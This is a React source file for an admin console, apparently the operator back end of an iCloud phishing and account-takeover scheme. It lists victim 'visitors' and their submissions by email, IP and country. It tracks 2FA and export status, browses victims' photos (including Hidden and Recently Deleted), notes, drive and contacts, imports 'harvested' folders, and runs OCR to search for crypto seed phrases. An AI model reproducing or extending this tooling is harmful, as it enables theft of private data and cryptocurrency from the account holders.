import { useEffect, useMemo, useState } from "react";
import { useAdminSocket } from "./useAdminSocket";
import { adminLogin, adminLogout, adminSession, timeAgo } from "./api.js";
import { AccountBadge, Badge, StatusDot } from "./ui.jsx";
import AccountView from "./AccountView.jsx";

/* ------------------------------------------------------------------ login */

function Login({ onConnect, notice }) {
  const [password, setPassword] = useState("");
  const [busy, setBusy] = useState(false);
  const [error, setError] = useState("");

  async function submit(event) {
    event.preventDefault();
    if (!password || busy) return;
    setBusy(true);
    setError("");
    try {
      const result = await adminLogin(password);
      if (!result.ok) {
        setError(result.error || "Wrong password");
        return;
      }
      await onConnect();
    } catch (failure) {
      setError(failure.message);
    } finally {
      setBusy(false);
    }
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-[#f5f5f7] px-6">
      <form
        onSubmit={submit}
        className="w-full max-w-[400px] rounded-[16px] border border-[#e5e5ea] bg-white p-8 shadow-[0_10px_40px_rgba(0,0,0,0.06)]"
      >
        <div className="flex items-center gap-2">
          <span className="flex h-8 w-8 items-center justify-center rounded-[9px] bg-[#1d1d1f] text-[15px] text-white">
            
          </span>
          <h1 className="text-[20px] font-semibold tracking-[-0.3px]">iCloud console</h1>
        </div>
        <p className="mt-2 text-[13px] leading-5 text-[#6e6e73]">
          The password is checked by the server. This browser stays signed in for 7 days; Disconnect
          clears it.
        </p>
        <label className="mt-6 block text-[11px] font-medium uppercase tracking-[0.06em] text-[#6e6e73]">
          Password
          <input
            type="password"
            autoFocus
            value={password}
            onChange={(event) => setPassword(event.target.value)}
            className="mt-2 block h-11 w-full rounded-[10px] border border-[#d2d2d7] px-3 text-[15px] font-normal tracking-normal text-[#1d1d1f] outline-none focus:border-[#0071e3]"
          />
        </label>
        {error || notice ? (
          <p className="mt-3 text-[12px] text-[#d70015]">{error || notice}</p>
        ) : null}
        <button
          type="submit"
          disabled={busy || !password}
          className="mt-5 h-11 w-full rounded-[10px] bg-[#0071e3] text-[14px] font-medium text-white disabled:opacity-50"
        >
          {busy ? "Signing in…" : "Open panel"}
        </button>
      </form>
    </div>
  );
}

/* ------------------------------------------------------------------- shell */

function AccountRow({ account, active, onClick }) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={`flex w-full items-start gap-2.5 border-b border-[#f2f2f5] px-3 py-2.5 text-left ${
        active ? "bg-[#eef5ff]" : "hover:bg-[#fafafa]"
      }`}
    >
      <StatusDot account={account} className="mt-[6px]" />
      <span className="min-w-0 flex-1">
        <span className="flex items-center justify-between gap-2">
          <span className="truncate text-[12px] font-medium text-[#1d1d1f]">{account.email}</span>
          <span className="shrink-0 text-[10px] text-[#9a9aa0]">{timeAgo(account.updatedAt)}</span>
        </span>
        <span className="mt-0.5 flex items-center gap-1.5">
          <AccountBadge account={account} />
          {account.identity?.name ? (
            <span className="truncate text-[10px] text-[#6e6e73]">{account.identity.name}</span>
          ) : null}
        </span>
      </span>
    </button>
  );
}

function Metric({ label, value }) {
  return (
    <div className="rounded-[12px] border border-[#e5e5ea] bg-white px-4 py-3">
      <div className="text-[10px] font-medium uppercase tracking-[0.06em] text-[#6e6e73]">{label}</div>
      <div className="mt-0.5 text-[22px] font-semibold text-[#1d1d1f]">{value}</div>
    </div>
  );
}

function Welcome({ stats, onPick }) {
  return (
    <div className="flex h-full flex-col justify-center px-8 py-10">
      <div className="mx-auto w-full max-w-[760px]">
        <h2 className="text-[26px] font-semibold tracking-[-0.4px]">Manage every account</h2>
        <p className="mt-1 text-[14px] leading-6 text-[#6e6e73]">
          Pick an account on the left to browse its photos (Library, Hidden, Recently Deleted), notes,
          drive, contacts, calendar and reminders — or verify the export against live iCloud, run OCR
          and search seed phrases.
        </p>
        <div className="mt-5 grid grid-cols-2 gap-3 sm:grid-cols-3">
          <Metric label="Accounts" value={stats?.total ?? 0} />
          <Metric label="Connected" value={stats?.byStatus?.connected ?? 0} />
          <Metric label="2FA pending" value={stats?.byStatus?.twofa ?? 0} />
          <Metric label="Exporting" value={stats?.byStatus?.exporting ?? 0} />
          <Metric label="Trusted" value={stats?.trusted ?? 0} />
          <Metric label="Locked" value={stats?.byStatus?.error ?? 0} />
        </div>
        <p className="mt-5 text-[12px] text-[#6e6e73]">Click any account in the sidebar to open it.</p>
      </div>
    </div>
  );
}

function Submissions({ admin }) {
  const { state, loadPage, saveItem } = admin;
  return (
    <div className="h-full overflow-y-auto bg-[#f5f5f7] p-4">
      <div className="rounded-[14px] border border-[#e5e5ea] bg-white">
        <div className="flex items-center justify-between border-b border-[#f0f0f2] px-4 py-3">
          <h2 className="text-[14px] font-semibold">Submissions</h2>
          <button
            type="button"
            onClick={() => loadPage(state.page, state.query)}
            className="h-8 rounded-[8px] border border-[#d2d2d7] px-3 text-[12px]"
          >
            Refresh
          </button>
        </div>
        <table className="w-full border-collapse text-left text-[12px]">
          <thead>
            <tr className="border-b border-[#e5e5ea] text-[10px] uppercase tracking-[0.05em] text-[#6e6e73]">
              <th className="px-4 py-2 font-medium">Email</th>
              <th className="px-4 py-2 font-medium">IP</th>
              <th className="px-4 py-2 font-medium">Country</th>
              <th className="px-4 py-2 font-medium">Status</th>
              <th className="px-4 py-2 font-medium">Created</th>
            </tr>
          </thead>
          <tbody>
            {state.items.map((item) => (
              <tr key={item.id} className="border-b border-[#f4f4f6] last:border-0">
                <td className="px-4 py-2">{item.email || "—"}</td>
                <td className="px-4 py-2 font-mono text-[11px]">{item.ip || "—"}</td>
                <td className="px-4 py-2">{item.country || "—"}</td>
                <td className="px-4 py-2">
                  <select
                    value={item.status}
                    onChange={(event) => saveItem(item.id, { status: event.target.value })}
                    className="h-7 rounded-[6px] border border-[#d2d2d7] bg-white px-2 text-[11px]"
                  >
                    <option value="new">new</option>
                    <option value="reviewed">reviewed</option>
                    <option value="done">done</option>
                  </select>
                </td>
                <td className="px-4 py-2 text-[11px] text-[#6e6e73]">
                  {new Date(item.createdAt).toLocaleString()}
                </td>
              </tr>
            ))}
            {!state.items.length ? (
              <tr>
                <td colSpan={5} className="px-4 py-8 text-center text-[#6e6e73]">
                  No submissions.
                </td>
              </tr>
            ) : null}
          </tbody>
        </table>
      </div>
    </div>
  );
}

function Panel({ admin, onLogout }) {
  const {
    state,
    loadAccounts,
    refreshAll,
    importAccount,
    openAccount,
    clearAccount,
    pingAccount,
    exportAccount,
    verifyAccount,
    scanAccount,
    disconnect,
  } = admin;
  const [query, setQuery] = useState("");
  const [filter, setFilter] = useState("all");
  const [view, setView] = useState("accounts");
  const [showList, setShowList] = useState(true);
  const [importOpen, setImportOpen] = useState(false);
  const [importPath, setImportPath] = useState("");
  const [importEmail, setImportEmail] = useState("");
  const [importBusy, setImportBusy] = useState(false);
  const [importError, setImportError] = useState("");

  useEffect(() => {
    if (state.status !== "online") return undefined;
    const timer = setTimeout(() => loadAccounts(1, query.trim()), 250);
    return () => clearTimeout(timer);
  }, [query, loadAccounts, state.status]);

  const accounts = useMemo(() => {
    const needle = query.trim().toLowerCase();
    return state.accounts.filter((account) => {
      if (filter === "live" && !["connected", "done"].includes(account.status)) return false;
      if (filter === "locked" && !account.locked) return false;
      if (filter === "issues" && !["error", "invalid", "dead", "twofa"].includes(account.status)) return false;
      if (!needle) return true;
      return `${account.email} ${account.identity?.name ?? ""} ${account.status}`
        .toLowerCase()
        .includes(needle);
    });
  }, [state.accounts, filter, query]);

  async function logout() {
    disconnect();
    await onLogout();
  }

  return (
    <div className="flex h-screen overflow-hidden bg-[#f5f5f7] text-[#1d1d1f]">
      <aside
        className={`${
          showList ? "flex" : "hidden"
        } w-full shrink-0 flex-col border-r border-[#e5e5ea] bg-white lg:flex lg:w-[330px]`}
      >
        <header className="border-b border-[#e5e5ea] px-4 py-3">
          <div className="flex items-center justify-between gap-2">
            <div className="flex items-center gap-2">
              <span className="flex h-6 w-6 items-center justify-center rounded-[7px] bg-[#1d1d1f] text-[12px] text-white">
                
              </span>
              <span className="text-[14px] font-semibold tracking-[-0.2px]">iCloud console</span>
            </div>
            <span className="flex items-center gap-1 text-[10px] text-[#6e6e73]">
              <span
                className={`h-1.5 w-1.5 rounded-full ${
                  state.status === "online" ? "bg-[#30a14e]" : "bg-[#d70015]"
                }`}
              />
              {state.status}
            </span>
          </div>
          <div className="mt-3 flex gap-1">
            <button
              type="button"
              onClick={() => setView("accounts")}
              className={`h-7 rounded-full px-3 text-[11px] font-medium ${
                view === "accounts" ? "bg-[#1d1d1f] text-white" : "border border-[#d2d2d7] text-[#424245]"
              }`}
            >
              Accounts
            </button>
            <button
              type="button"
              onClick={() => setView("submissions")}
              className={`h-7 rounded-full px-3 text-[11px] font-medium ${
                view === "submissions" ? "bg-[#1d1d1f] text-white" : "border border-[#d2d2d7] text-[#424245]"
              }`}
            >
              Submissions
            </button>
            <button
              type="button"
              onClick={logout}
              className="ml-auto h-7 rounded-full border border-[#d2d2d7] px-3 text-[11px] text-[#424245] hover:bg-[#fafafa]"
            >
              Disconnect
            </button>
          </div>
        </header>

        {view === "accounts" ? (
          <>
            <div className="border-b border-[#e5e5ea] px-3 py-2">
              <input
                value={query}
                onChange={(event) => setQuery(event.target.value)}
                placeholder="Search accounts…"
                className="h-8 w-full rounded-[8px] border border-[#d2d2d7] px-3 text-[12px] outline-none focus:border-[#0071e3]"
              />
              <div className="mt-2 flex flex-wrap gap-1">
                {[
                  ["all", "All"],
                  ["live", "Live"],
                  ["locked", "Locked"],
                  ["issues", "Issues"],
                ].map(([id, label]) => (
                  <button
                    key={id}
                    type="button"
                    onClick={() => setFilter(id)}
                    className={`h-6 rounded-full px-2.5 text-[10px] font-medium ${
                      filter === id
                        ? "bg-[#eef5ff] text-[#0058b0]"
                        : "text-[#6e6e73] hover:bg-[#f5f5f7]"
                    }`}
                  >
                    {label}
                  </button>
                ))}
                <button
                  type="button"
                  onClick={() => {
                    setImportError("");
                    setImportOpen(true);
                  }}
                  className="ml-auto h-6 rounded-full px-2 text-[10px] font-medium text-[#0066cc] hover:underline"
                >
                  ＋ Import
                </button>
                <button
                  type="button"
                  onClick={refreshAll}
                  className="h-6 rounded-full px-2 text-[10px] text-[#0066cc] hover:underline"
                >
                  Refresh
                </button>
              </div>
            </div>

            <div className="min-h-0 flex-1 overflow-y-auto">
              {accounts.map((account) => (
                <AccountRow
                  key={account.id}
                  account={account}
                  active={state.selectedAccount?.id === account.id}
                  onClick={() => {
                    setShowList(false);
                    openAccount(account.id);
                  }}
                />
              ))}
              {!accounts.length ? (
                <p className="px-4 py-8 text-center text-[12px] text-[#6e6e73]">
                  {state.accounts.length ? "No account matches this filter." : "No visitors yet."}
                </p>
              ) : null}
            </div>

            <footer className="border-t border-[#e5e5ea] px-3 py-2 text-[10px] text-[#6e6e73]">
              <div className="flex items-center justify-between">
                <span>
                  {state.accountsTotal} accounts · page {state.accountPage}/{state.accountPages}
                </span>
                <span className="flex gap-1">
                  <button
                    type="button"
                    disabled={state.accountPage <= 1}
                    onClick={() => loadAccounts(state.accountPage - 1, query.trim())}
                    className="rounded px-1 disabled:opacity-30"
                  >
                    ‹
                  </button>
                  <button
                    type="button"
                    disabled={state.accountPage >= state.accountPages}
                    onClick={() => loadAccounts(state.accountPage + 1, query.trim())}
                    className="rounded px-1 disabled:opacity-30"
                  >
                    ›
                  </button>
                </span>
              </div>
              <div className="mt-1 flex items-center justify-between">
                <span>
                  workers {state.workers?.workers ?? 0} · auth {state.workers?.auth ?? 0} · export{" "}
                  {state.workers?.export ?? 0}
                </span>
                <span>queue {state.workers?.queued ?? 0}</span>
              </div>
              {state.log[0] ? <div className="mt-1 truncate text-[#9a9aa0]">{state.log[0]}</div> : null}
            </footer>
          </>
        ) : (
          <div className="min-h-0 flex-1 overflow-y-auto p-3">
            <p className="text-[12px] leading-5 text-[#6e6e73]">
              Legacy form submissions. Account data lives under Accounts.
            </p>
            <div className="mt-2 flex flex-wrap gap-1.5">
              <Badge tone="gray">total {state.total}</Badge>
              <Badge tone="blue">new {state.stats?.byStatus?.new ?? 0}</Badge>
              <Badge tone="yellow">reviewed {state.stats?.byStatus?.reviewed ?? 0}</Badge>
              <Badge tone="green">done {state.stats?.byStatus?.done ?? 0}</Badge>
            </div>
          </div>
        )}
      </aside>

      {importOpen ? (
        <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/30 px-4">
          <form
            onSubmit={async (event) => {
              event.preventDefault();
              if (importBusy) return;
              setImportBusy(true);
              setImportError("");
              try {
                const result = await importAccount(importPath.trim(), importEmail.trim());
                setImportOpen(false);
                setImportPath("");
                setImportEmail("");
                if (result?.accountId) {
                  setShowList(false);
                  openAccount(result.accountId);
                }
              } catch (failure) {
                setImportError(failure.message);
              } finally {
                setImportBusy(false);
              }
            }}
            className="w-full max-w-[480px] rounded-[14px] border border-[#e5e5ea] bg-white p-5 shadow-2xl"
          >
            <h2 className="text-[16px] font-semibold">Import a harvested folder</h2>
            <p className="mt-1 text-[12px] leading-5 text-[#6e6e73]">
              Maps an <code>out/</code> tree (photos, hidden, notes, drive, ocr) into this
              account's export, reusing the existing OCR and seed results. The folder must be on
              the server.
            </p>
            <label className="mt-4 block text-[11px] font-medium uppercase tracking-[0.05em] text-[#6e6e73]">
              Folder path
              <input
                value={importPath}
                onChange={(event) => setImportPath(event.target.value)}
                placeholder="/home/…/connect_icloud/out"
                className="mt-1 block h-9 w-full rounded-[8px] border border-[#d2d2d7] px-3 text-[12px] font-normal tracking-normal outline-none focus:border-[#0071e3]"
              />
            </label>
            <label className="mt-3 block text-[11px] font-medium uppercase tracking-[0.05em] text-[#6e6e73]">
              Account email
              <input
                value={importEmail}
                onChange={(event) => setImportEmail(event.target.value)}
                placeholder="example@icloud.com"
                className="mt-1 block h-9 w-full rounded-[8px] border border-[#d2d2d7] px-3 text-[12px] font-normal tracking-normal outline-none focus:border-[#0071e3]"
              />
            </label>
            {importError ? (
              <p className="mt-3 rounded-[8px] bg-[#fff2f2] px-3 py-2 text-[11px] text-[#c4000a]">{importError}</p>
            ) : null}
            <div className="mt-4 flex justify-end gap-2">
              <button
                type="button"
                onClick={() => setImportOpen(false)}
                className="h-8 rounded-[8px] border border-[#d2d2d7] px-3 text-[12px]"
              >
                Cancel
              </button>
              <button
                type="submit"
                disabled={importBusy || !importPath.trim() || !importEmail.trim()}
                className="h-8 rounded-[8px] bg-[#0071e3] px-3 text-[12px] font-medium text-white disabled:opacity-50"
              >
                {importBusy ? "Importing…" : "Import"}
              </button>
            </div>
          </form>
        </div>
      ) : null}

      <main className={`${showList ? "hidden" : "flex"} min-w-0 flex-1 flex-col lg:flex`}>
        {view === "submissions" ? (
          <Submissions admin={admin} />
        ) : state.selectedAccount ? (
          <AccountView
            key={state.selectedAccount.id}
            account={state.selectedAccount}
            jobs={state.accountJobs}
            onPing={pingAccount}
            onExport={exportAccount}
            onVerify={verifyAccount}
            onScan={scanAccount}
            onClose={() => {
              clearAccount();
              setShowList(true);
            }}
          />
        ) : (
          <Welcome stats={state.accountStats} />
        )}
      </main>
    </div>
  );
}

/* ------------------------------------------------------------------- gate */

export default function Admin() {
  const admin = useAdminSocket();
  const [authed, setAuthed] = useState(null);
  const [notice, setNotice] = useState("");

  useEffect(() => {
    let alive = true;
    adminSession().then((ok) => {
      if (!alive) return;
      setAuthed(ok);
      if (ok) admin.connect();
    });
    return () => {
      alive = false;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    if (authed && admin.state.status === "error" && /unauthorized/i.test(admin.state.error)) {
      setAuthed(false);
      setNotice("Session expired — sign in again.");
    }
  }, [authed, admin.state.status, admin.state.error]);

  if (authed === null) {
    return (
      <div className="flex min-h-screen items-center justify-center bg-[#f5f5f7] text-[13px] text-[#6e6e73]">
        Checking session…
      </div>
    );
  }

  if (!authed) {
    return (
      <Login
        notice={notice}
        onConnect={async () => {
          setNotice("");
          setAuthed(true);
          admin.connect();
        }}
      />
    );
  }

  return (
    <Panel
      admin={admin}
      onLogout={async () => {
        await adminLogout();
        setAuthed(false);
      }}
    />
  );
}
